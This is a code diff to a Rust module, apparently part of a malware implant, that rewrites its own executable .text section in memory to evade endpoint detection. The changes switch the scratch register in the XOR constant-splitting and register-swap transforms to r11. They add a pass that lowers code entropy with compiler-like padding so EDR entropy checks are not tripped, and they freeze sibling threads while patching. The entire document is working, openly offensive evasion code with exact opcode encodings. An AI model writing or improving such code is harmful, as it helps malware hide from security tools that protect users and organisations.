@@ -13,11 +13,11 @@
 //! 3. **NOP sled insertion**: semantic-equivalent nops (`xchg rax,rax`,
 //!    `lea rsp,[rsp+0]`, `mov rdi,rdi`) — randomized between cycles
 //! 4. **Constant splitting**: `mov rax, 0xDEAD` →
-//!    `mov rcx, (0xDEAD ^ key); xor rcx, key; xchg rax, rcx`
+//!    `mov r11, (0xDEAD ^ key); xor r11, key; xchg rax, r11`
 //!    where key is a random 32-bit value.  The immediate is XOR-encoded
 //!    at rest and decoded at runtime.
-//! 5. **Register swap (rax↔rcx)**: `mov rax, imm64` → `mov rcx, imm64;
-//!    xchg rax, rcx` — fallback when constant splitting can't apply
+//! 5. **Register swap (rax↔r11)**: `mov rax, imm64` → `mov r11, imm64;
+//!    xchg rax, r11` — fallback when constant splitting can't apply
 //!    (not enough trailing padding)
 //! 6. **Jump obfuscation**: short jmp (`EB XX`) → long jmp
 //!    (`E9 XXXXXXXX`) + NOP padding
@@ -113,6 +113,11 @@ pub struct TransformCycleResult {
     pub skipped: u32,
     /// Elapsed time in milliseconds.
     pub elapsed_ms: u64,
+    /// Shannon entropy of the entire `.text` section before transforms.
+    pub entropy_before: f64,
+    /// Shannon entropy of the entire `.text` section after transforms (and
+    /// any de-entropization pass).
+    pub entropy_after: f64,
 }
 
 // ── Signature database ──────────────────────────────────────────────────────
@@ -226,6 +231,9 @@ static LAST_TRANSFORM_COUNT: AtomicU32 = AtomicU32::new(0);
 
 /// Total transforms applied since agent start.
 static TOTAL_TRANSFORMS: AtomicU64 = AtomicU64::new(0);
+
+/// Unix timestamp (seconds) of the most recent scan/transform cycle.
+static LAST_SCAN_TIMESTAMP: AtomicU64 = AtomicU64::new(0);
 
 /// Most recent cycle result (for status queries).
 static LAST_RESULT: Lazy<Mutex<Option<TransformCycleResult>>> =
@@ -499,17 +507,25 @@ fn transform_nop_insertion(text: &mut [u8], excluded: &[bool], actionable: &Hash
     records
 }
 
-/// Apply register swap: `mov rax, imm64` → `mov rcx, imm64; xchg rax, rcx`.
+/// Apply register swap: `mov rax, imm64` → `mov r11, imm64; xchg rax, r11`.
 ///
-/// Replaces the 10-byte `mov rax, imm64` (48 B8 …) with `mov rcx, imm64`
-/// (48 B9 …) and, when 2 bytes of NOP/CC padding follow, appends `xchg rax,
-/// rcx` (48 91) to restore the value into rax.  This changes the byte
+/// Replaces the 10-byte `mov rax, imm64` (48 B8 …) with `mov r11, imm64`
+/// (49 BB …) and, when 2 bytes of NOP/CC padding follow, appends `xchg rax,
+/// r11` (49 93) to restore the value into rax.  This changes the byte
 /// pattern for EDR evasion without altering the final rax value.
 ///
-/// **Note**: the `xchg` clobbers rcx.  If rcx is live at this point the
-/// surrounding code must not depend on its value.  The exclusion bitmap
-/// should protect critical sequences (syscall setup, etc.).
-fn transform_register_swap_rax_rcx(text: &mut [u8], excluded: &[bool], actionable: &HashSet<usize>) -> Vec<TransformRecord> {
+/// **Note**: the `xchg` clobbers r11.  r11 is volatile/caller-saved in both
+/// System V and Windows x64 ABIs and is not used for argument passing.
+/// The exclusion bitmap should still protect critical sequences (syscall
+/// setup, etc.).
+///
+/// P2-02: Uses `r11` as the scratch register instead of `rcx`.  `rcx` is
+/// the first argument register in the Windows x64 ABI (holds the first
+/// function argument / `this` pointer); clobbering it in the middle of
+/// a function could corrupt argument passing.  `r11` is volatile and
+/// caller-saved in both System V and Windows x64 ABIs, and is not used
+/// for argument passing in either convention.
+fn transform_register_swap_rax_r11(text: &mut [u8], excluded: &[bool], actionable: &HashSet<usize>) -> Vec<TransformRecord> {
     let mut records = Vec::new();
 
     // Look for: 48 B8 XX XX XX XX XX XX XX XX (mov rax, imm64) — 10 bytes
@@ -540,16 +556,17 @@ fn transform_register_swap_rax_rcx(text: &mut [u8], excluded: &[bool], actionabl
 
         let before = text[offset..offset + 10].to_vec();
 
-        // Replace `mov rax, imm64` (48 B8) with `mov rcx, imm64` (48 B9).
-        text[offset + 1] = 0xB9; // change B8 → B9
+        // Replace `mov rax, imm64` (48 B8) with `mov r11, imm64` (49 BB).
+        text[offset] = 0x49;      // REX.WB prefix for r11
+        text[offset + 1] = 0xBB; // change B8 → BB (r11)
 
-        // If 2 bytes of NOP/CC padding follow, append `xchg rax, rcx` so
+        // If 2 bytes of NOP/CC padding follow, append `xchg rax, r11` so
         // the value ends up back in rax.
         let xchg_written = if offset + 12 <= text.len() {
             let tail = &text[offset + 10..offset + 12];
             if tail.iter().all(|&b| b == 0x90 || b == 0xCC) {
-                text[offset + 10] = 0x48;
-                text[offset + 11] = 0x91; // xchg rax, rcx
+                text[offset + 10] = 0x49; // REX.WB
+                text[offset + 11] = 0x93; // xchg rax, r11
                 true
             } else {
                 false
@@ -560,11 +577,12 @@ fn transform_register_swap_rax_rcx(text: &mut [u8], excluded: &[bool], actionabl
 
         if !xchg_written {
             // No room for xchg — skip this transformation entirely.
-            // Changing mov rax -> mov rcx without the xchg would corrupt
+            // Changing mov rax -> mov r11 without the xchg would corrupt
             // any downstream code that reads rax, since the value would
-            // land in rcx instead. Without liveness analysis, we cannot
+            // land in r11 instead. Without liveness analysis, we cannot
             // safely apply a partial transformation.
             // Restore the original opcode before skipping.
+            text[offset] = 0x48;
             text[offset + 1] = 0xB8;
             continue;
         }
@@ -574,7 +592,7 @@ fn transform_register_swap_rax_rcx(text: &mut [u8], excluded: &[bool], actionabl
 
         records.push(TransformRecord {
             offset,
-            transform_type: "register_swap_rax_rcx".to_string(),
+            transform_type: "register_swap_rax_r11".to_string(),
             before_hex: hex_encode(&before),
             after_hex: hex_encode(&after),
             size_delta,
@@ -584,24 +602,28 @@ fn transform_register_swap_rax_rcx(text: &mut [u8], excluded: &[bool], actionabl
     records
 }
 
-/// Apply constant splitting: `mov rax, imm64` → XOR-encoded via rcx.
+/// Apply constant splitting: `mov rax, imm64` → XOR-encoded via r11.
 ///
 /// For `mov rax, imm64` (48 B8 …) instructions where the upper 32 bits of
 /// the immediate are zero (common on Windows for addresses and syscall numbers
 /// in the low 4 GB), replaces the instruction with:
 ///
 /// ```text
-///   mov rcx, (original_lo32 ^ key)  ; 48 B9 XX XX XX XX 00 00 00 00  (10 bytes)
-///   xor rcx, key                    ; 48 81 F1 KK KK KK KK            ( 7 bytes)
-///   xchg rax, rcx                   ; 48 91                           ( 2 bytes)
+///   mov r11, (original_lo32 ^ key)  ; 49 BB XX XX XX XX 00 00 00 00  (10 bytes)
+///   xor r11, key                    ; 49 81 F3 KK KK KK KK            ( 7 bytes)
+///   xchg rax, r11                   ; 49 93                           ( 2 bytes)
 /// ```
 ///
-/// After execution, `rax` holds the original value and `rcx` is clobbered.
+/// After execution, `rax` holds the original value and `r11` is clobbered.
 /// Total footprint: 19 bytes, but we reuse the 10-byte original + up to 9
 /// bytes of trailing NOP/CC padding.
 ///
+/// P2-02: Uses `r11` instead of `rcx` to avoid clobbering the Windows x64
+/// first-argument register.  `r11` is volatile/caller-saved and not used for
+/// argument passing.
+///
 /// If fewer than 9 bytes of padding are available, the transform is skipped
-/// for that location (falling back to `transform_register_swap_rax_rcx`
+/// for that location (falling back to `transform_register_swap_rax_r11`
 /// which needs only 2 bytes).
 ///
 /// The XOR key is a random non-zero 32-bit value, regenerated per hit.
@@ -661,24 +683,24 @@ fn transform_constant_splitting(text: &mut [u8], excluded: &[bool], actionable: 
 
         let before = text[offset..offset + 19].to_vec();
 
-        // Instruction 1: mov rcx, (lo32 ^ key) with upper 32 bits zero.
-        // 48 B9 EE EE EE EE 00 00 00 00  (10 bytes)
-        text[offset] = 0x48;
-        text[offset + 1] = 0xB9; // B9 = mov rcx, imm64
+        // Instruction 1: mov r11, (lo32 ^ key) with upper 32 bits zero.
+        // 49 BB EE EE EE EE 00 00 00 00  (10 bytes)
+        text[offset] = 0x49;      // REX.WB prefix for r11
+        text[offset + 1] = 0xBB; // BB = mov r11, imm64
         text[offset + 2..offset + 6].copy_from_slice(&encoded.to_le_bytes());
         text[offset + 6..offset + 10].copy_from_slice(&[0u8; 4]); // upper 32 = 0
 
-        // Instruction 2: xor rcx, key
-        // 48 81 F1 KK KK KK KK  (7 bytes)
-        text[offset + 10] = 0x48;
+        // Instruction 2: xor r11, key
+        // 49 81 F3 KK KK KK KK  (7 bytes)
+        text[offset + 10] = 0x49; // REX.WB
         text[offset + 11] = 0x81;
-        text[offset + 12] = 0xF1; // ModRM: xor rcx, imm32
+        text[offset + 12] = 0xF3; // ModRM: xor r11, imm32
         text[offset + 13..offset + 17].copy_from_slice(&key.to_le_bytes());
 
-        // Instruction 3: xchg rax, rcx
-        // 48 91  (2 bytes)
-        text[offset + 17] = 0x48;
-        text[offset + 18] = 0x91; // xchg rax, rcx
+        // Instruction 3: xchg rax, r11
+        // 49 93  (2 bytes)
+        text[offset + 17] = 0x49; // REX.WB
+        text[offset + 18] = 0x93; // xchg rax, r11
 
         let after = text[offset..offset + 19].to_vec();
 
@@ -774,6 +796,156 @@ fn transform_register_reassignment(_text: &mut [u8], _excluded: &[bool], _action
     Vec::new()
 }
 
+// ── Entropy-aware transformation pass ───────────────────────────────────────
+
+/// Shannon entropy floor for a region that should contain code.
+/// Below this value the transform may have failed or the region is suspiciously
+/// uniform (e.g., all NOPs / all CCs).  A warning is logged but no bytes are
+/// changed — the existing transforms should have diversified the region.
+const ENTROPY_FLOOR: f64 = 5.5;
+
+/// Maximum number of de-entropization replacements per cycle.  Keeps the pass
+/// bounded even on large .text sections.
+const MAX_DEENTROPY_REPLACEMENTS: usize = 16;
+
+/// Low-entropy padding patterns that mimic legitimate compiler output.
+///
+/// These are used by the de-entropization pass to replace high-entropy semantic
+/// NOPs inserted during the transform cycle.  Each pattern is a repeated byte
+/// sequence that compilers commonly emit as function padding or alignment.
+const LOW_ENTROPY_PATTERNS: &[&[u8]] = &[
+    // INT3 padding (MSVC / LINK default function separation)
+    &[0xCC, 0xCC, 0xCC, 0xCC],
+    // NOP padding (GCC / MinGW alignment)
+    &[0x90, 0x90, 0x90, 0x90],
+    // 2-byte NOP + 2-byte INT3 (mixed padding at block boundaries)
+    &[0x90, 0x90, 0xCC, 0xCC],
+    // CC 90 CC 90 (alternating — low entropy but still distinct bytes)
+    &[0xCC, 0x90, 0xCC, 0x90],
+];
+
+/// Apply a de-entropization pass to reduce the Shannon entropy of transformed
+/// `.text` regions that exceed the configured threshold.
+///
+/// After the main transform cycle, regions that had randomized semantic NOPs
+/// inserted may push the overall `.text` entropy above the EDR detection
+/// threshold.  This pass replaces some of those randomized NOPs with
+/// low-entropy padding that mimics legitimate compiler output (repeated CC or
+/// NOP patterns), bringing entropy back under the threshold.
+///
+/// **Safety**: Only replaces bytes in locations that were *already transformed*
+/// by `transform_nop_insertion` or similar NOP-producing passes.  Never touches
+/// bytes that were part of a signature-breaking transform (instruction
+/// substitution, constant splitting, etc.).  The de-entropization pass only
+/// adjusts the encoding of inserted padding — it does not undo any
+/// signature-breaking changes.
+///
+/// # Arguments
+///
+/// * `text` — Mutable `.text` section bytes.
+/// * `transforms_applied` — Transforms already applied this cycle (used to
+///   identify NOP-insertion sites that are safe to de-entropize).
+/// * `excluded` — Exclusion bitmap (never touch excluded bytes).
+/// * `entropy_threshold` — Maximum acceptable Shannon entropy.
+///
+/// # Returns
+///
+/// A vector of `TransformRecord` entries for the de-entropization replacements.
+fn deentropize_pass(
+    text: &mut [u8],
+    transforms_applied: &[TransformRecord],
+    excluded: &[bool],
+    entropy_threshold: f64,
+) -> Vec<TransformRecord> {
+    let current_entropy = shannon_entropy(text);
+
+    // Only run if entropy exceeds the configured threshold.
+    if current_entropy <= entropy_threshold {
+        log::debug!(
+            "edr_bypass_transform: entropy {:.3} within threshold {:.3}, de-entropization skipped",
+            current_entropy,
+            entropy_threshold,
+        );
+        return Vec::new();
+    }
+
+    log::info!(
+        "edr_bypass_transform: entropy {:.3} exceeds threshold {:.3}, running de-entropization pass",
+        current_entropy,
+        entropy_threshold,
+    );
+
+    // Collect offsets that were NOP insertions — these are safe to replace
+    // with low-entropy equivalents because they don't break signatures.
+    let nop_sites: Vec<usize> = transforms_applied
+        .iter()
+        .filter(|r| r.transform_type == "semantic_nop_insertion")
+        .map(|r| r.offset)
+        .collect();
+
+    if nop_sites.is_empty() {
+        log::debug!(
+            "edr_bypass_transform: no semantic NOP sites to de-entropize"
+        );
+        return Vec::new();
+    }
+
+    let mut records = Vec::new();
+    let mut rng = rand::thread_rng();
+    let mut replacements = 0;
+
+    for site_offset in &nop_sites {
+        if replacements >= MAX_DEENTROPY_REPLACEMENTS {
+            break;
+        }
+
+        // Pick a random low-entropy pattern (4 bytes).
+        let pattern_idx = rng.gen_range(0..LOW_ENTROPY_PATTERNS.len());
+        let pattern = LOW_ENTROPY_PATTERNS[pattern_idx];
+        let pat_len = pattern.len();
+
+        // Verify the site has enough room and isn't excluded.
+        if site_offset + pat_len > text.len() {
+            continue;
+        }
+        if excluded[*site_offset..*site_offset + pat_len]
+            .iter()
+            .any(|&b| b)
+        {
+            continue;
+        }
+
+        let before = text[*site_offset..*site_offset + pat_len].to_vec();
+        text[*site_offset..*site_offset + pat_len].copy_from_slice(pattern);
+
+        records.push(TransformRecord {
+            offset: *site_offset,
+            transform_type: "deentropize_low_entropy_padding".to_string(),
+            before_hex: hex_encode(&before),
+            after_hex: hex_encode(pattern),
+            size_delta: 0, // Same-size replacement
+        });
+        replacements += 1;
+
+        // Check entropy after each replacement — stop early if we're under.
+        let new_entropy = shannon_entropy(text);
+        if new_entropy <= entropy_threshold {
+            log::info!(
+                "edr_bypass_transform: de-entropization reduced entropy to {:.3} after {} replacements",
+                new_entropy,
+                replacements,
+            );
+            break;
+        }
+    }
+
+    log::info!(
+        "edr_bypass_transform: de-entropization applied {} low-entropy replacements",
+        replacements,
+    );
+    records
+}
+
 // ── Verification ────────────────────────────────────────────────────────────
 
 /// Compute the SHA-256 hash of the current `.text` section.
@@ -863,11 +1035,17 @@ unsafe fn restore_protection(base: usize, size: usize, original: u32) -> Result<
 /// # Safety
 ///
 /// This function modifies executable memory in-place.  All sibling OS threads
-/// must be suspended during the transformation window.  The caller is
-/// responsible for thread synchronization (the same approach as
-/// `self_reencode::reencode_text`).
+/// are suspended during the transformation window via
+/// `self_reencode::freeze_threads()` (NtSuspendThread / SIGSTOP).
+/// Threads are automatically resumed on success or failure (Drop guard).
 pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> Result<TransformCycleResult> {
     let start = std::time::Instant::now();
+
+    // P1-03: Suspend all sibling threads before touching .text to avoid
+    // race conditions where another thread executes partially-written code.
+    // The FrozenThreads guard auto-resumes on Drop (panic-safe).
+    let mut frozen = crate::self_reencode::freeze_threads()
+        .context("edr_bypass_transform: failed to freeze sibling threads")?;
 
     // Step 1: Locate .text section.
     let text_section = crate::self_reencode::find_text_section()
@@ -879,6 +1057,13 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
     // Step 2: Hash before.
     let text_before = unsafe { std::slice::from_raw_parts(text_ptr, text_size) };
     let hash_before = hash_text(text_before);
+
+    // Step 2b: Compute entropy before transforms.
+    let entropy_before = shannon_entropy(text_before);
+    log::info!(
+        "edr_bypass_transform: .text entropy before transforms: {:.3}",
+        entropy_before,
+    );
 
     // Step 3: Make .text writable.
     let original_protect = unsafe { make_region_writable(text_section.base, text_section.size) }
@@ -955,10 +1140,10 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
         all_transforms.extend(recs);
     }
 
-    // 5. Register swap (rax↔rcx) — weaker fallback for locations where
+    // 5. Register swap (rax↔r11) — weaker fallback for locations where
     //    constant splitting couldn't apply (not enough padding room).
     if applied < max_transforms {
-        let recs = transform_register_swap_rax_rcx(text_mut, &excluded, &actionable_offsets);
+        let recs = transform_register_swap_rax_r11(text_mut, &excluded, &actionable_offsets);
         for r in &recs {
             log::debug!("edr_bypass_transform: applied {} at offset {}", r.transform_type, r.offset);
         }
@@ -990,13 +1175,58 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
     all_transforms.truncate(max_transforms as usize);
     applied = all_transforms.len() as u32;
 
+    // Step 6b: Entropy-aware de-entropization pass.
+    // After the main transform cycle, if entropy exceeds the threshold,
+    // replace some randomized semantic NOPs with low-entropy padding that
+    // mimics legitimate compiler output (repeated CC/90 patterns).
+    // This only adjusts NOP-insertion sites — it never undoes
+    // signature-breaking transforms.
+    if applied > 0 {
+        let deent_recs = deentropize_pass(text_mut, &all_transforms, &excluded, entropy_threshold);
+        if !deent_recs.is_empty() {
+            log::debug!(
+                "edr_bypass_transform: de-entropization replaced {} NOP sites with low-entropy padding",
+                deent_recs.len(),
+            );
+            // De-entropization records are informational — they don't count
+            // against the main transform budget.
+            all_transforms.extend(deent_recs);
+        }
+    }
+
     // Step 7: Count skipped (in exclusion zone or above entropy threshold).
     // P2-17: Use actionable_offsets (post-entropy-filter) not raw hits.
     let skipped = actionable_offsets.len().saturating_sub(applied as usize) as u32;
 
-    // Step 8: Hash after.
+    // Step 8: Hash after + compute entropy after.
     let text_after = unsafe { std::slice::from_raw_parts(text_ptr, text_size) };
     let hash_after = hash_text(text_after);
+    let entropy_after = shannon_entropy(text_after);
+
+    // Step 8b: Low-entropy warning.
+    // If any transformed region has suspiciously low entropy (below floor),
+    // it may indicate a failed transform or unexpected uniformity.
+    for rec in all_transforms.iter() {
+        let rec_end = (rec.offset + rec.after_hex.len() / 2).min(text_after.len());
+        if rec.offset >= rec_end {
+            continue;
+        }
+        let region_entropy = shannon_entropy(&text_after[rec.offset..rec_end]);
+        if region_entropy < ENTROPY_FLOOR {
+            log::warn!(
+                "edr_bypass_transform: transformed region at offset {} has low entropy {:.3} (floor: {:.3}) — possible failed transform",
+                rec.offset,
+                region_entropy,
+                ENTROPY_FLOOR,
+            );
+        }
+    }
+
+    log::info!(
+        "edr_bypass_transform: .text entropy after transforms: {:.3} (delta: {:+.3})",
+        entropy_after,
+        entropy_after - entropy_before,
+    );
 
     // Step 9: Restore page protection.
     unsafe {
@@ -1017,11 +1247,23 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
         }
     }
 
+    // P1-03: Resume sibling threads now that .text is restored and flushed.
+    // The FrozenThreads Drop guard would also do this, but explicit thaw
+    // ensures threads resume *after* the cache flush.
+    frozen.thaw();
+
     let elapsed = start.elapsed();
 
     // Update global stats.
     LAST_TRANSFORM_COUNT.store(applied, Ordering::Relaxed);
     TOTAL_TRANSFORMS.fetch_add(applied as u64, Ordering::Relaxed);
+    LAST_SCAN_TIMESTAMP.store(
+        std::time::SystemTime::now()
+            .duration_since(std::time::UNIX_EPOCH)
+            .unwrap_or_default()
+            .as_secs(),
+        Ordering::Relaxed,
+    );
 
     let result = TransformCycleResult {
         hash_before,
@@ -1030,13 +1272,17 @@ pub fn run_edr_bypass_transform(max_transforms: u32, entropy_threshold: f64) -> 
         transforms_applied: all_transforms,
         skipped,
         elapsed_ms: elapsed.as_millis() as u64,
+        entropy_before,
+        entropy_after,
     };
 
     log::info!(
-        "edr_bypass_transform: cycle complete — {} transforms applied, {} skipped, {} ms",
+        "edr_bypass_transform: cycle complete — {} transforms applied, {} skipped, {} ms, entropy {:.3}→{:.3}",
         applied,
         skipped,
         elapsed.as_millis(),
+        entropy_before,
+        entropy_after,
     );
 
     // Store last result for status queries.
@@ -1057,6 +1303,8 @@ pub fn status() -> String {
     let last_transforms = LAST_TRANSFORM_COUNT.load(Ordering::Relaxed);
     let total_transforms = TOTAL_TRANSFORMS.load(Ordering::Relaxed);
 
+    let last_timestamp = LAST_SCAN_TIMESTAMP.load(Ordering::Relaxed);
+
     let last_cycle_info = {
         let guard = LAST_RESULT.lock().unwrap();
         guard.as_ref().map(|r| {
@@ -1067,6 +1315,8 @@ pub fn status() -> String {
                 "transforms_applied": r.transforms_applied.len(),
                 "skipped": r.skipped,
                 "elapsed_ms": r.elapsed_ms,
+                "entropy_before": r.entropy_before,
+                "entropy_after": r.entropy_after,
             })
         })
     };
@@ -1075,6 +1325,7 @@ pub fn status() -> String {
         "last_scan_hits": last_scan,
         "last_cycle_transforms": last_transforms,
         "total_transforms": total_transforms,
+        "last_scan_timestamp": if last_timestamp > 0 { Some(last_timestamp) } else { None },
         "last_cycle": last_cycle_info,
     });
 
